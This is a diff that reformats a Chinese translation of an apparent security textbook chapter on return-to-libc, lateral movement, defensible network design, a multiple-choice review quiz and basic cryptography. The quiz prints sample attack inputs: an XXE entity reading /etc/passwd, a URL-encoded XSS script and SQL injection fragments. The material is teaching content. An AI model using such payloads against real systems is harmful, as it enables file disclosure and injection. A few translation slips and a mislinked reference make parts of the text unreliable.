 一种绕过方法是使用一种称为“返回到 libc”的攻击技术。C 标准库由于许多程序仍然使用 C 语言编写，以及像 C++ 这样的衍生语言，它是一组在程序中非常常用的函数。例如，下面的程序完全由 C 标准库中的函数组成。其中，`printf` 用于输出信息，`scanf` 用于从用户处获取信息。
 
@@ -10936,20 +11997,27 @@ teardrop 攻击是指攻击者向目标发送碎片化的 IP 包，并使碎片�
 #include<stdio.h>
 
 int main(int argc, char **argv) {
+
     char name[25];
+
     printf("What is your name? ");
+
     scanf("%s", name);
+
     printf("Hello, %s\n", name);
 
     return 0;
+
 }
 ```
+
+
 
 如果在每个要使用 C 标准库的程序中都加载 C 标准库会非常浪费内存。相反，为什么不使用已经加载到内存中的单一副本，让每个程序通过它所在的位置来引用它呢？这意味着 C 标准库可能在内存中固定的位置。程序在运行时会得到函数的正确地址，因此在运行时使用的是地址而不是函数名。如果属实，这些函数调用的地址可以被预测。这意味着攻击者不再需要提供代码。标准库中已有的函数（如 `execv`）可以被使用。`execv` 及其相关函数会向操作系统请求执行磁盘上可能存在的程序。一旦实现这一点，攻击者可能直接调用 shell，而不需要注入代码来调用该 shell。
 
 另一种保护应用的方法是让栈不可执行。这意味着属于栈段的任何内存块会被操作系统标记，任何指向该段的地址都会失败，因为栈段不允许运行可执行代码。这同样是防止传统缓冲区溢出攻击的保护措施，因为攻击者插入 shellcode 的位置在栈上。
 
-虽然这种方法以及布局随机化可以防止传统缓冲区溢出攻击，但“返回到 libc”攻击仍然可行，因为 libc 必须是可执行的，和程序的 `.text` 段一样，因为那里存放可执行代码。
+虽然这种方法以及布局随机化可以防止传统缓冲区溢出攻击，但“返回到 `libc`”攻击仍然可行，因为 `libc` 必须是可执行的，和程序的 `.text` 段一样，因为那里存放可执行代码。
 
 ## Lateral Movement
 
@@ -10983,9 +12051,6 @@ int main(int argc, char **argv) {
 
 “活在林中”（living off the land）是攻击者使用的概念。过去，攻击者可能需要下载工具包，通常是编译的软件。如今，Linux 系统通常自带 Python 解释器，可用于多种目的。Windows 方面，PowerShell 可用，且每个 PowerShell 版本的更新都引入了大量新功能。攻击者意识到这一点，开始使用 PowerShell 在本地网络中发起攻击。
 
-
-
-
 -   [防御深度](https://wiki.example.org/feynmans_learning_method)在很长一段时间内被认为是保护网络及其资源的最佳方式。它是来自军事领域的概念，有时被称为`castle defense`。防御深度策略的核心是拖延攻击者，争取时间让防御者准备并将攻击者赶出。网络采用分层方式，设置多层保护措施。Figure 12.8 展示了一个简单的网络设计，包含多个控制层以防止攻击。网络中部署了多个防火墙，用于在网络段之间实施更严格的访问控制。这意味着即使攻击者突破了第一道防线，后续的防线也会略有不同，攻击者必须重新开始。
 
 在防御深度策略中，防火墙并非唯一的防护手段。防火墙之上还有访问控制列表（ACL），这些列表可以在路由器上实现，用于分隔那些没有防火墙的网络段。这在面向外部的路由器上尤其常见。细粒度的访问控制不应放在边界路由器上。然而，访问控制功能在边界路由器上也有多种用途，包括丢弃所谓的“火星包”（Martian packets）的所有网络流量。火星包是指源地址来自本应不应发出的地址空间的包。这包括 RFC 1918 定义的所有私有地址空间以及其他保留的地址空间。
@@ -11004,9 +12069,6 @@ int main(int argc, char **argv) {
 
 日志是构建可辩护网络架构的 essential 方面。网络设备可以生成 NetFlow 数据，用于存储连接的摘要信息。事件发生后，拥有足够的数据来判断该事件是否达到需要调查的 incident 级别将非常有帮助。没有像 NetFlow 这样的数据，无法了解哪些系统在通信以及它们通信对象，这会使事件范围更难确定，也更难识别受影响的系统。没有这些额外信息，网络中可能存在 adversary，在收集数据。
 
-
-
-
 当然，记录也可能是一项昂贵的活动。至少，除了日志本身（例如 Web 服务器、反向代理服务器、Active Directory 服务器、防火墙、入侵检测系统等），你还需要一个存储和查询这些日志的地方。这可能是 `Elastic Stack` 或 `Splunk` 之类的，也可能是一个完整的安全信息和事件管理（SIEM）解决方案。SIEM 可以帮助组织和关联数据，并且能够管理流入的事件，包括生成警报。
 
 当然，这不仅仅是关于记录和可见性。一旦在环境中识别出攻击者，就需要能够进行响应。这包括能够隔离系统以及在网络中设置拥堵点。隔离系统并不只是把它从网络中拔掉。你可能需要在尝试弄清其渗透范围的同时，继续让攻击者保持对你系统的访问。你需要防止攻击者继续访问网络中的其他系统。隔离意味着能够将其及其流量与网络的其他部分分离开来。
@@ -11019,7 +12081,7 @@ int main(int argc, char **argv) {
 
 另一种实现这种隔离的方式是使用端点检测与响应（EDR）软件，这类软件通常具备隔离或 containment 受 compromized 系统的功能，以防止进一步传播到网络。可防御网络架构的概念并非是防止坏人进入，而是在他们进入后能够监控和控制他们。
 
-**Summary**
+## Summary
 
 传统的攻击方式会利用监听服务的漏洞，甚至利用网络栈实现的实现漏洞。这不是现代攻击的主要场所。相反，攻击往往通过社交工程发生。攻击常见于应用层，而 Web 应用是用户与企业交互的常见渠道，因而成为攻击者的好目标。有几种常见的 Web 应用攻击方式，这些攻击可以让攻击者获取数据或甚至访问底层系统。例如，XML 外部实体处理（XXE）可以利用 XML 访问底层系统函数和文件；SQL 注入不仅能让攻击者读取数据库中的数据，在某些情况下还能获得操作系统访问权限。
 
@@ -11027,7 +12089,7 @@ int main(int argc, char **argv) {
 
 Web 应用在开发时可以通过多种方式进行防护。首先，每个函数应对输入进行验证，即使预期该输入来自受信任来源。此外，不应直接将用户输入传递给任何子系统，这样做可能导致诸如命令注入等攻击。
 
-在应用层利用方面，攻击者试图将其代码注入到应用程序的内存空间中，以此控制程序的执行流，操控指针，告诉处理器从哪里获取指令。缓冲区溢出可以将指令和返回地址推 onto 栈，从而让攻击者控制程序的执行流，这被称为 `*arbitrary code execution*`。另一种攻击涉及堆（heap），即动态数据存储的内存结构。堆喷（heap spraying）是攻击者在堆中注入代码，一旦代码进入堆，攻击者就可以诱导程序在堆上执行这些指令。
+在应用层利用方面，攻击者试图将其代码注入到应用程序的内存空间中，以此控制程序的执行流，操控指针，告诉处理器从哪里获取指令。缓冲区溢出可以将指令和返回地址推 onto 栈，从而让攻击者控制程序的执行流，这被称为 `arbitrary code execution`。另一种攻击涉及堆（heap），即动态数据存储的内存结构。堆喷（heap spraying）是攻击者在堆中注入代码，一旦代码进入堆，攻击者就可以诱导程序在堆上执行这些指令。
 
 一旦攻击者进入环境，他们会寻求横向移动，以获取其他系统的访问权限。这可能涉及特权提升和更多侦察，以便访问可能包含更多数据的系统。
 
@@ -11035,132 +12097,137 @@ Web 应用在开发时可以通过多种方式进行防护。首先，每个函�
 
 可防御网络架构是一种新兴的网络架构和设计方法，它基于这样认识：社交工程攻击非常常见，同时也高度重视可见性和响应，因为 breaches（入侵）非常普遍且未必可以避免。日志是检测的关键，当收集大量日志时，管理这些日志的系统（如 SIEM）是必需的。可防御网络架构认识到攻击者会通过社交工程或其他看似合法的用法进入系统。因此，可防御架构在攻击者进入后增加了隔离、 containment 与监控的能力。
 
-**Review Questions**
+## Review Questions
 
 你可以在附录中找到答案。
 
+1. 什么协议用于 Smurf 攻击？
+   1. DNS
+   2. ICMP
+   3. TCP
+   4. SMTP
 
+2. 如果在数据包捕获中看到 `’` 或 `1=1;`，你会预期发生了什么？
+   1. 跨站脚本
+   2. 命令注入
+   3. SQL 注入
+   4. XML 外部实体注入
 
+3. 哪个协议常用于放大攻击？
+   1. TCP
+   2. SMTP
+   3. DNS
+   4. XML
 
-1. 什么协议用于 Smurf 攻击？  
-1. DNS  
-2. ICMP  
-3. TCP  
-4. SMTP  
+4. SYN 洪水的目的是什么？
+   1. 填满操作系统中的连接缓冲区
+   2. 填满 web 服务器中的连接缓冲区
+   3. 填满应用层中的连接缓冲区
+   4. 填满 UDP 的连接缓冲区
 
-2. 如果在数据包捕获中看到 `’` 或 `1=1;`，你会预期发生了什么？  
-1. 跨站脚本  
-2. 命令注入  
-3. SQL 注入  
-4. XML 外部实体注入  
+5. 慢读攻击（slowloris）是如何工作的？
+   1. 在操作系统中保持打开的连接缓冲区
+   2. 在 web 服务器中保持打开的连接缓冲区
+   3. 在应用层中保持打开的连接缓冲区
+   4. 在 UDP 中保持打开的连接缓冲区
 
-3. 哪个协议常用于放大攻击？  
-1. TCP  
-2. SMTP  
-3. DNS  
-4. XML  
+6. 将字符串 `AAAAAAAAAAAAAAAAA` 输入到只分配了 8 字节空间的变量中会发生什么？
+   1. 堆喷射
+   2. SQL 注入
+   3. 缓冲区溢出
+   4. 慢读攻击
 
-4. SYN 洪水的目的是什么？  
-1. 填满操作系统中的连接缓冲区  
-2. 填满 web 服务器中的连接缓冲区  
-3. 填满应用层中的连接缓冲区  
-4. 填满 UDP 的连接缓冲区  
+7. 跨站脚本（XSS）攻击的目标是什么？
+   1. Web 服务器
+   2. 数据库服务器
+   3. 第三方服务器
+   4. 用户
 
-5. 慢读攻击（slowloris）是如何工作的？  
-1. 在操作系统中保持打开的连接缓冲区  
-2. 在 web 服务器中保持打开的连接缓冲区  
-3. 在应用层中保持打开的连接缓冲区  
-4. 在 UDP 中保持打开的连接缓冲区  
+8. 在数据包捕获中看到以下内容，你会认为发生了什么？
 
-6. 将字符串 `AAAAAAAAAAAAAAAAA` 输入到只分配了 8 字节空间的变量中会发生什么？  
-1. 堆喷射  
-2. SQL 注入  
-3. 缓冲区溢出  
-4. 慢读攻击  
-
-7. 跨站脚本（XSS）攻击的目标是什么？  
-1. Web 服务器  
-2. 数据库服务器  
-3. 第三方服务器  
-4. 用户  
-
-8. 在数据包捕获中看到以下内容，你会认为发生了什么？  
 ```
 <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-```  
-1. 跨站脚本  
-2. SQL 注入  
-3. 命令注入  
-4. XML 外部实体注入  
+```
 
-9. 防止 SQL 注入攻击的保护措施是什么？  
-1. 缓冲区溢出  
-2. 输入验证  
-3. XML 过滤  
-4. 横向移动  
+   1. 跨站脚本
+   2. SQL 注入
+   3. 命令注入
+   4. XML 外部实体注入
 
-10. 防御深度网络设计中至关重要的安全元素是什么？  
-1. 防火墙  
-2. SIEM  
-3. Web 应用防火墙  
-4. 日志管理系统  
+9. 防止 SQL 注入攻击的保护措施是什么？
+   1. 缓冲区溢出
+   2. 输入验证
+   3. XML 过滤
+   4. 横向移动
 
-11. 防御深度（defense‑in‑breadth）方法会增加什么？  
-1. 对更广泛攻击范围的考虑  
-2. 对 SQL 注入的防护  
-3. 对缓冲区溢出的防护  
-4. 对堆喷射的防护  
+10. 防御深度网络设计中至关重要的安全元素是什么？
+    1. 防火墙
+    2. SIEM
+    3. Web 应用防火墙
+    4. 日志管理系统
 
-12. 哪种攻击会将代码注入动态分配的内存中？  
-1. 缓冲区溢出  
-2. 跨站脚本  
-3. 堆喷射  
-4. 慢读攻击  
+11. 防御深度（defense‑in‑breadth）方法会增加什么？
+    1. 对更广泛攻击范围的考虑
+    2. 对 SQL 注入的防护
+    3. 对缓冲区溢出的防护
+    4. 对堆喷射的防护
 
-13. 在数据包捕获中看到以下内容，你会预期发生了什么？  
+12. 哪种攻击会将代码注入动态分配的内存中？
+    1. 缓冲区溢出
+    2. 跨站脚本
+    3. 堆喷射
+    4. 慢读攻击
+
+13. 在数据包捕获中看到以下内容，你会预期发生了什么？
+
 ```
 %3Cscript%3Ealert('wubble');%3C/script%3E
-```  
-1. SQL 注入  
-2. 命令注入  
-3. 跨站脚本  
-4. 缓冲区溢出  
+```
 
-14. 对下面的字符串进行了什么操作？  
+    1. SQL 注入
+    2. 命令注入
+    3. 跨站脚本
+    4. 缓冲区溢出
+
+14. 对下面的字符串进行了什么操作？
+
 ```
 %3Cscript%3Ealert('wubble');%3C/script%3E
-```  
-1. Base64 编码  
-2. URL 编码  
+```
+
+
+
+1. `Base64` 编码  
+2. `URL` 编码  
 3. 加密  
 4. 密码散列  
 
 15. 慢读攻击使用的技术是什么？  
-1. 小型 HTTP 头请求  
-2. 小型 HTTP 体请求  
-3. 小型 HTTP POST 请求  
+1. 小型 `HTTP` 头请求  
+2. 小型 `HTTP` 体请求  
+3. 小型 `HTTP POST` 请求  
 4. 小型文件检索请求  
 
 16. 哪个元素可以用于促进日志收集、聚合和关联？  
 1. 日志管理器  
 2. 防火墙  
-3. 入侵检测系统（IDS）  
-4. SIEM  
+3. 入侵检测系统（`IDS`）  
+4. `SIEM`  
 
 17. 命令注入攻击的目标是什么？  
 1. 操作系统  
-2. Web 服务器  
+2. `Web` 服务器  
 3. 数据库服务器  
 4. 用户  
 
-18. 低轨道炮（Low Orbit Ion Cannon）主要用于什么？  
-1. SQL 注入攻击  
+18. 低轨道炮（`Low Orbit Ion Cannon`）主要用于什么？  
+1. `SQL` 注入攻击  
 2. 日志管理  
 3. 拒绝服务攻击  
 4. 缓冲区溢出  
 
 19. 你可以使用什么来告知防御策略？  
-1. SIEM 输出  
+1. `SIEM` 输出  
 2. 攻击生命周期  
 3. 日志  
 4. 入侵检测系统  
@@ -11171,41 +12238,41 @@ Web 应用在开发时可以通过多种方式进行防护。首先，每个函�
 3. 指令指针  
 4. 缓冲区指针  
 
-21. 哪种防护技术最适合用于防御 SQL 注入攻击？  
+21. 哪种防护技术最适合用于防御 `SQL` 注入攻击？  
 1. 返回 `libc`  
-2. Web 应用防火墙  
+2. `Web` 应用防火墙  
 3. 地址空间布局随机化  
 4. 栈守护  
 
-22. 如果你想获取 web 服务器文件系统中的文件，下面哪种攻击技术可能会被使用？  
+22. 如果你想获取 `web` 服务器文件系统中的文件，下面哪种攻击技术可能会被使用？  
 1. 跨站脚本  
 2. 命令注入  
-3. SQL 注入  
+3. `SQL` 注入  
 4. 目录遍历  
 
 23. 区分防御性网络架构与防御深度的两个重要特征是什么？  
-1. 防火墙和 DMZ  
-2. 蜜罐和 DMZ  
+1. 防火墙和 `DMZ`  
+2. 蜜罐和 `DMZ`  
 3. 隔离和恶意软件防护  
 4. 限制和监控  
 
 24. 哪种系统可以用于陷阱并监控攻击者？  
-1. Web 应用防火墙  
+1. `Web` 应用防火墙  
 2. 下一代防火墙  
 3. 蜜罐  
-4. DMZ  
+4. `DMZ`  
 
-25. 哪种攻击技术可以绕过地址空间布局随机化（ASLR）？  
+25. 哪种攻击技术可以绕过地址空间布局随机化（`ASLR`）？  
 1. 返回 `libc`  
 2. 栈守护  
 3. 缓冲区溢出  
-4. 返回 JavaScript  
+4. 返回 `JavaScript`  
 
-26. 如果你在一台不加密所有流量的 Web 服务器上发现异常，你会看到什么？  
+26. 如果你在一台不加密所有流量的 `Web` 服务器上发现异常，你会看到什么？  
 1. 所有流量都是加密的  
-2. 即使是宣传类（brochureware）流量也以明文传输  
+2. 即使是宣传类（`brochureware`）流量也以明文传输  
 3. 只有邮件服务器使用加密  
-4. TLS 只能用于 HTTPS  
+4. `TLS` 只能用于 `HTTPS`  
 
 27. 加密的基本概念是什么？  
 1. 隐藏写作  
@@ -11225,9 +12292,6 @@ Web 应用在开发时可以通过多种方式进行防护。首先，每个函�
 3. 解密数据  
 4. 管理密钥  
 
-
-
-
 加密是关于隐私和保密性，但重要的是要意识到加密并不是解决所有问题的办法。全盘加密很常见。全盘加密保护的是一个“死”硬盘（即它不在已启动的系统中）。如果攻击者通过恶意软件或窃取的凭据获取系统访问权限，且恶意软件在合法用户权限上运行或窃取的凭据拥有系统权限，那么硬盘加密就毫无意义。已登录的用户的系统看起来对该用户是未加密的。手机设备的加密存储也是如此。因此，认识到加密能做什么、不能做什么是很重要的。
 
 ## 基础加密
@@ -11238,14 +12302,16 @@ Web 应用在开发时可以通过多种方式进行防护。首先，每个函�
 
 并非所有加密都必须使用当今的数学过程。目标仅仅是生成一段即使被拦截的读者在没有额外信息的情况下无法阅读的内容。早期的密码学方法是旋转密码。它取一个字母表并将字母旋转若干位置。将原始字母表置于上方，旋转后的字母表置于下方，即可轻松在两者之间转换。如果原始字母表在上方，加密就是直接取位于其下方的字母。这种加密方式称为 `替换密码`，因为一个字母被固定、已知的方式替换为另一个字母。下面是一个示例：
 
-**旋转密码**
+旋转密码
 
 ```
 `ABCDEFGHIJKLMNOPQRSTUVWXYZ`
+
 `EFGHIJKLMNOPQRSTUVWXYZABCD`
-          
- 
 ```
+
+
+
 
 要加密单词 `hello`，你需要在上方行找到每个字母，然后在下方行找到对应的字母。这会得到 `lipps` 作为密文。解密时，你在下方行找到每个字母，并将其替换为同一位置在上方行的对应字母。这种加密技术据说是朱利叶斯·凯撒用来向野外将领发送信息的。如果信息被拦截，除非拥有密钥（即字母表旋转的位数），否则无法阅读。
 
@@ -11257,7 +12323,7 @@ Web 应用在开发时可以通过多种方式进行防护。首先，每个函�
 
 **FIGURE 13.1** 英文字母正态分布
 
-由于旋转密码易于破解，尤其是当攻击者知道这是旋转密码时，还有其他手工加密方法。其中一种采用多维度方法。它不再是简单地在上方放置一个旋转后的字母表，而是使用网格。拥有网格后，需要更复杂的密钥。此时，可以使用一个单词作为密钥，这个单词决定了如何将明文转换为密文。这种密码被称为 **维吉尼亚密码**（Vigenère cipher），以其开发者 Blaise de Vigenère 命名。
+由于旋转密码易于破解，尤其是当攻击者知道这是旋转密码时，还有其他手工加密方法。其中一种采用多维度方法。它不再是简单地在上方放置一个旋转后的字母表，而是使用网格。拥有网格后，需要更复杂的密钥。此时，可以使用一个单词作为密钥，这个单词决定了如何将明文转换为密文。这种密码被称为 `维吉尼亚密码`（Vigenère cipher），以其开发者 Blaise de Vigenère 命名。
 
 你可以在 Figure 13.2 中看到使用维吉尼亚密码加密消息时所需的网格或方格示例。该过程通过取明文和作为密钥的单词来实现。假设密钥为 `hello`，要加密的单词是 `deforestation`。由于密钥字母数与明文不一致，需要重复密钥直到与明文长度匹配。此例中，密钥变为 `hellohellohel` 以匹配 `deforestation` 的 13 个字母。密钥字母在上方行与明文字母在左侧列对应，两者交叉的位置即为密文字母。例如，该示例的密文为 `kiqzflwelhpsy`。
 
@@ -11272,9 +12338,6 @@ Web 应用在开发时可以通过多种方式进行防护。首先，每个函�
 ### Diffie–Hellman
 
 正如你可能预期的，密钥管理在密码学中至关重要。密钥事先已知，有时被称为 `pre‑shared keys`（预共享密钥），因为它们在需要时已经提前共享。如果密钥未提前共享，则需要两方在加密通信中安全共享密钥，且不被拦截。一旦密钥被知晓，信息就不再是加密的。理想情况下，密钥根本不需要交换。当密钥交换时，存在被窃听的风险。更好的做法是双方自行推导密钥，即密钥永不直接交换。
-
-
-
 
 Whitfield Diffie 和 Martin Hellman 发明了一种方法，使两个端点能够在不传输任何可被用来推导密钥的数据的前提下生成密钥。虽然其细节涉及大量数学，这里不作深入探讨，但概念上足以理解。Figure 13.3 展示了使用 Diffie‑Hellman 方式生成密钥的过程，利用油漆来示意。
 
@@ -11294,73 +12357,68 @@ Diffie‑Hellman 交换得到的密钥是对称密钥，因为相同的密钥用
 
 ### Data Encryption Standard
 
-数据加密标准（DES）是一种使用对称密钥的区块加密算法，现已被淘汰。其重要之处在于仅使用 56 位密钥。1970 年代在 IBM 的 Lucifer  cipher  基础上批准时，计算能力不足以支撑更长的密钥长度，故仅接受 56 位密钥。随着计算能力提升，即使算法本身未出现缺陷，56 位密钥仍易受 brute‑force 攻击 —  — 攻击者可尝试所有可能的密钥以期提取明文。DES 的块大小为 64 位，但密钥仅 56 位，因为 8 位用于奇偶校验。
+数据加密标准（DES）是一种使用对称密钥的区块加密算法，现已被淘汰。其重要之处在于仅使用 56 位密钥。1970 年代在 IBM 的 Lucifer cipher 基础上批准时，计算能力不足以支撑更长的密钥长度，故仅接受 56 位密钥。随着计算能力提升，即使算法本身未出现缺陷，56 位密钥仍易受 brute‑force 攻击 —  — 攻击者可尝试所有可能的密钥以期提取明文。DES 的块大小为 64 位，但密钥仅 56 位，因为 8 位用于奇偶校验。
 
 当 DES 被证明存在安全隐患时，国家标准与技术研究院（NIST）启动了寻找替代算法的计划。但该计划进度不足以保护正在使用 DES 加密的数据，于是提出了短期的临时措施：在原算法基础上多次应用，以提升强度。若多次使用相同密钥，仍可能因密钥本身的弱点被攻击。更可行的短期方案是使用多个不同的密钥。
 
 三重 DES（3DES）使用三个密钥，使有效密钥长度提升至 168 位。但这并非一个 168 位的密钥，而是三个独立的 56 位密钥依次使用。第一个密钥用于加密消息，第二个密钥用于解密（实质上仍是密文），第三个密钥再次用于加密，从而得到最终的密文。换句话说，流程是：明文 →（密钥 1）→ 密文 →（密钥 2）→ 密文 →（密钥 3）→ 最终密文。
 
-尽管 DES 与 3DES 均已被淘汰，但它们提醒我们：**密钥长度并不等同于安全**，算法本身的安全性更为关键。即使把密钥长度翻倍或三倍，若算法本身薄弱，仍可能被破解。 additionally，3DES 的 168 位并非单一密钥长度，而是三个 56 位密钥的组合。
+尽管 DES 与 3DES 均已被淘汰，但它们提醒我们：**密钥长度并不等同于安全**，算法本身的安全性更为关键。即使把密钥长度翻倍或三倍，若算法本身薄弱，仍可能被破解。additionally，3DES 的 168 位并非单一密钥长度，而是三个 56 位密钥的组合。
 
 ### Advanced Encryption Standard
 
-DES 的替代算法是高级加密标准（AES）。正如 Lucifer 用于创建 DES，Rijndael  cipher 也被用作 AES 的基础。Rijndael 与 AES 的区别在于，Rijndael 为算法本身，而 AES 为标准化的实现。Rijndael 早期研发，AES 标准于 2001 年发布。AES 是区块加密，支持多种密钥长度，块长度固定为 128 位。选定 AES 时，同时指定了三种密钥长度：128 位、192 位和 256 位。正如 56 位密钥的 DES 随时间变得脆弱，AES 在 128 位密钥长度下也被发现存在理论弱点，业界普遍倾向于使用更长的密钥长度。计算能力不再是限制因素，因此更长的密钥长度更易支持。
+DES 的替代算法是高级加密标准（AES）。正如 Lucifer 用于创建 DES，Rijndael cipher 也被用作 AES 的基础。Rijndael 与 AES 的区别在于，Rijndael 为算法本身，而 AES 为标准化的实现。Rijndael 早期研发，AES 标准于 2001 年发布。AES 是区块加密，支持多种密钥长度，块长度固定为 128 位。选定 AES 时，同时指定了三种密钥长度：128 位、192 位和 256 位。正如 56 位密钥的 DES 随时间变得脆弱，AES 在 128 位密钥长度下也被发现存在理论弱点，业界普遍倾向于使用更长的密钥长度。计算能力不再是限制因素，因此更长的密钥长度更易支持。
 
-需要注意的一点是，加密算法仅是整体安全体系的**一部分**，完整的安全组合称为 *ciphersuite*，包含以下几个要素：
+需要注意的一点是，加密算法仅是整体安全体系的一部分，完整的安全组合称为 ciphersuite，包含以下几个要素：
 
-1. **密钥交换算法**（常见为 DH，但不限于此）  
-2. **加密算法**（如 AES）  
-3. **消息验证码**（用于认证）
+1. 密钥交换算法（常见为 DH，但不限于此）
+2. 加密算法（如 AES）
+3. 消息验证码（用于认证）
 
 下面的代码片段展示了 Google 网页服务器所支持的 ciphersuite 列表，该列表是通过 `sslscan` 工具生成的，用于识别使用 SSL/TLS 协议的服务器所支持的加密套件。
 
-  **Ciphersuites**
+**Ciphersuites**
 
+- [支持的服务器密码套件：](https://example.org) 首选 TLSv1.3 128 位 TLS_AES_128_GCM_SHA256 曲线 25519 DHE 253
+  接受 TLSv1.3 256 位 TLS_AES_256_GCM_SHA384 曲线 25519 DHE 253
+  接受 TLSv1.3 256 位 TLS_CHACHA20_POLY1305_SHA256 曲线 25519 DHE 253
+  首选 TLSv1.2 256 位 ECDHE-ECDSA-CHACHA20-POLY1305 曲线 25519 DHE 253
+  接受 TLSv1.2 128 位 ECDHE-ECDSA-AES128-GCM-SHA256 曲线 25519 DHE 253
+  接受 TLSv1.2 256 位 ECDHE-ECDSA-AES256-GCM-SHA384 曲线 25519 DHE 253
+  接受 TLSv1.2 128 位 ECDHE-ECDSA-AES128-SHA 曲线 25519 DHE 253
+  接受 TLSv1.2 256 位 ECDHE-ECDSA-AES256-SHA 曲线 25519 DHE 253
+  接受 TLSv1.2 256 位 ECDHE-RSA-CHACHA20-POLY1305 曲线 25519 DHE 253
+  接受 TLSv1.2 128 位 ECDHE-RSA-AES128-GCM-SHA256 曲线 25519 DHE 253
+  接受 TLSv1.2 256 位 ECDHE-RSA-AES256-GCM-SHA384 曲线 25519 DHE 253
+  接受 TLSv1.2 128 位 ECDHE-RSA-AES128-SHA 曲线 25519 DHE 253
+  接受 TLSv1.2 256 位 ECDHE-RSA-AES256-SHA 曲线 25519 DHE 253
+  接受 TLSv1.2 128 位 AES128-GCM-SHA256
+  接受 TLSv1.2 256 位 AES256-GCM-SHA384
+  接受 TLSv1.2 128 位 AES128-SHA
+  接受 TLSv1.2 256 位 AES256-SHA
+  接受 TLSv1.2 112 位 DES-CBC3-SHA
 
+在该列表中可以看到 AES‑128 和 AES‑256 都被支持。值得注意的是，DES 也在 Google 的 Web 服务器上被支持。虽然它已被 AES 取代，但在某些功能较弱的系统上仍有浏览器需要使用。这意味着 DES 可能仍然是必要的。虽然它被接受，但并非首选算法。这里的 DES 采用 Cipher Block Chaining (CBC) 模式，这是一种进一步变换消息的方式。在 CBC 中，每个密文块都会与前一个块进行异或（XOR）操作。由于第一个块没有前一个块，会使用初始化向量（IV）与其异或。请记住，密文始终是二进制的，因为每个字节可能不与可打印的 ASCII 字符对齐。
 
+针对 AES 的潜在成功攻击数量有限，其中一种是侧信道攻击。侧信道攻击不依赖于算法本身的弱点，而是针对实现。攻击者可以通过观察功耗或处理器利用率等渠道获取信息。还可能出现电磁泄漏，为攻击者提供信息。这类攻击需要深入理解密码学和系统工作原理，普通用户难以实施。这并不表示 AES 完全安全，但目前尚未发现该算法本身的弱点。
 
--   [支持的服务器密码套件：](https://example.org) 首选 TLSv1.3 128 位 TLS_AES_128_GCM_SHA256 曲线 25519 DHE 253  
-    接受 TLSv1.3 256 位 TLS_AES_256_GCM_SHA384 曲线 25519 DHE 253  
-    接受 TLSv1.3 256 位 TLS_CHACHA20_POLY1305_SHA256 曲线 25519 DHE 253  
-    首选 TLSv1.2 256 位 ECDHE-ECDSA-CHACHA20-POLY1305 曲线 25519 DHE 253  
-    接受 TLSv1.2 128 位 ECDHE-ECDSA-AES128-GCM-SHA256 曲线 25519 DHE 253  
-    接受 TLSv1.2 256 位 ECDHE-ECDSA-AES256-GCM-SHA384 曲线 25519 DHE 253  
-    接受 TLSv1.2 128 位 ECDHE-ECDSA-AES128-SHA 曲线 25519 DHE 253  
-    接受 TLSv1.2 256 位 ECDHE-ECDSA-AES256-SHA 曲线 25519 DHE 253  
-    接受 TLSv1.2 256 位 ECDHE-RSA-CHACHA20-POLY1305 曲线 25519 DHE 253  
-    接受 TLSv1.2 128 位 ECDHE-RSA-AES128-GCM-SHA256 曲线 25519 DHE 253  
-    接受 TLSv1.2 256 位 ECDHE-RSA-AES256-GCM-SHA384 曲线 25519 DHE 253  
-    接受 TLSv1.2 128 位 ECDHE-RSA-AES128-SHA 曲线 25519 DHE 253  
-    接受 TLSv1.2 256 位 ECDHE-RSA-AES256-SHA 曲线 25519 DHE 253  
-    接受 TLSv1.2 128 位 AES128-GCM-SHA256  
-    接受 TLSv1.2 256 位 AES256-GCM-SHA384  
-    接受 TLSv1.2 128 位 AES128-SHA  
-    接受 TLSv1.2 256 位 AES256-SHA  
-    接受 TLSv1.2 112 位 DES-CBC3-SHA  
+还有其他类型的密码学攻击，包括相关密钥攻击。相关密钥攻击是指攻击者可以观察使用多个不同密钥加密的密文。攻击者并不知道具体密钥值（否则直接使用密钥解密），但攻击者知道密钥之间存在某种数学关系。例如，大量相同位数的密钥可能导致此类关系。2009 年，有人提出利用 AES 关键调度的相关密钥攻击。防止此类攻击的关键在于实现：实现 AES 时应禁止使用相关密钥。
 
-    在该列表中可以看到 AES‑128 和 AES‑256 都被支持。值得注意的是，DES 也在 Google 的 Web 服务器上被支持。虽然它已被 AES 取代，但在某些功能较弱的系统上仍有浏览器需要使用。这意味着 DES 可能仍然是必要的。虽然它被接受，但并非首选算法。这里的 DES 采用 Cipher Block Chaining (CBC) 模式，这是一种进一步变换消息的方式。在 CBC 中，每个密文块都会与前一个块进行异或（XOR）操作。由于第一个块没有前一个块，会使用初始化向量（IV）与其异或。请记住，密文始终是二进制的，因为每个字节可能不与可打印的 ASCII 字符对齐。
+虽然存在针对 AES 的关键恢复攻击，使得攻击者能够获取密钥用于解密密文，但这些攻击只能缩短暴力破解所需的时间，仍然需要大量时间和计算资源。更长的密钥长度有助于防御此类攻击。总体而言，目前没有实用的 AES 攻击。
 
-    针对 AES 的潜在成功攻击数量有限，其中一种是侧信道攻击。侧信道攻击不依赖于算法本身的弱点，而是针对实现。攻击者可以通过观察功耗或处理器利用率等渠道获取信息。还可能出现电磁泄漏，为攻击者提供信息。这类攻击需要深入理解密码学和系统工作原理，普通用户难以实施。这并不表示 AES 完全安全，但目前尚未发现该算法本身的弱点。
+### 非对称密钥加密
 
-    还有其他类型的密码学攻击，包括相关密钥攻击。相关密钥攻击是指攻击者可以观察使用多个不同密钥加密的密文。攻击者并不知道具体密钥值（否则直接使用密钥解密），但攻击者知道密钥之间存在某种数学关系。例如，大量相同位数的密钥可能导致此类关系。2009 年，有人提出利用 AES 关键调度的相关密钥攻击。防止此类攻击的关键在于实现：实现 AES 时应禁止使用相关密钥。
+对称密钥加密使用同一密钥进行加密和解密，而非对称密钥加密则使用两把密钥。因此，非对称密钥加密也称为 `公钥加密`。其中一把是公钥，另一把是私钥。这两把密钥在数学上相互关联，使得用一把加密的内容可以用另一把解密。这解决了在双方之间传递密钥的问题。如果有两把密钥，只需保护其中一把，另一把可以安全传输。事实上，公钥本身就是公开的，只有拥有公钥的人才能使用它。
 
-    虽然存在针对 AES 的关键恢复攻击，使得攻击者能够获取密钥用于解密密文，但这些攻击只能缩短暴力破解所需的时间，仍然需要大量时间和计算资源。更长的密钥长度有助于防御此类攻击。总体而言，目前没有实用的 AES 攻击。
